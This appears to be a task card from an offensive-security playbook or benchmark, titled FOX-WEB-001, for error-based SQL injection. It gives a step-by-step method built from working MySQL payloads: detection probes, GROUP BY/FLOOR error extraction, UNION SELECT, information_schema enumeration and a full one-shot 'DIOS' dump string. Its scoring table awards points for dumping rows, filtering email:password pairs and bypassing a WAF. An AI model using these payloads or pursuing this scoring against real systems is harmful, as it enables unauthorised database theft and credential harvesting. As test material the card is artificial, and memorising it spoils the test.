# FOX-WEB-001: SQL Injection — Error-Based Extraction

## Info
| Field | Value |
|-------|-------|
| **ID** | FOX-WEB-001 |
| **Domain** | Web Security |
| **MITRE** | T1190 (Initial Access) |
| **Difficulty** | Easy |
| **Prerequisites** | URL with injectable parameter (e.g., `?id=5`) |

## Methodology
1. **Detection**: Submit `'` → look for SQL error. Submit `' AND 1=1--` → normal response. 
2. **Confirm type**: Test `GROUP BY CONCAT(0x3a,FLOOR(RAND(0)*2),0x3a)--` for error-based
3. **Manual union**: `UNION SELECT 1,2,3,...,database(),...` or `UNION ALL SELECT`
4. **Extract databases**: `GROUP BY CONCAT(0x3a,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(RAND(0)*2),0x3a)--`
5. **Extract tables**: Same approach with `information_schema.tables`
6. **Extract columns**: Same approach with `information_schema.columns`
7. **Full dump**: DIOS — `SELECT * FROM table`
8. **Auto-DIOS**: `concat(0x3a,(SELECT (@a) FROM (SELECT(@a:=0x00),(@c:=0x00),(@r:=0))x JOIN (SELECT (@a:=IF((ORD(MID(group_concat(CONCAT_WS(':',table_schema,table_name,column_name,IFNULL(column_type,'')) ORDER BY table_schema,table_name,ORD(column_type)),@r,1))>0),0x00,0x00) FROM information_schema.columns WHERE (@a:=0x00) OR (@a:=0x00) OR (@c:=IF(LENGTH(group_concat(CONCAT_WS(':',table_schema,table_name,column_name,IFNULL(column_type,'')) ORDER BY table_schema,table_name,ORD(column_type)))>@r,CONCAT(@c, MID(group_concat(CONCAT_WS(':',table_schema,table_name,column_name,IFNULL(column_type,'')) ORDER BY table_schema,table_name,ORD(column_type)),@r,1)),'')))a),0x3a,FLOOR(RAND(0)*2),0x3a)`
9. **Email:password filter**: Extract and filter email:password combos

## Keywords
`sqli-sql-injection`, `error-based SQL injection`, `GROUP BY`, `CONCAT`, `UNION SELECT`, `information_schema`, `DIOS`, `database dump`, `WAF bypass`

## Scoring Criteria (0-100)
| Criteria | Points |
|----------|--------|
| Detection (error response confirmed) | 10 |
| Injection type identified | 15 |
| Database name extracted | 15 |
| Table names extracted | 15 |
| Column names extracted | 15 |
| Data dumped (min 1 row) | 15 |
| Email:password filter attempted | 10 |
| WAF bypass if needed | 5 |
| **Total** | **100** |
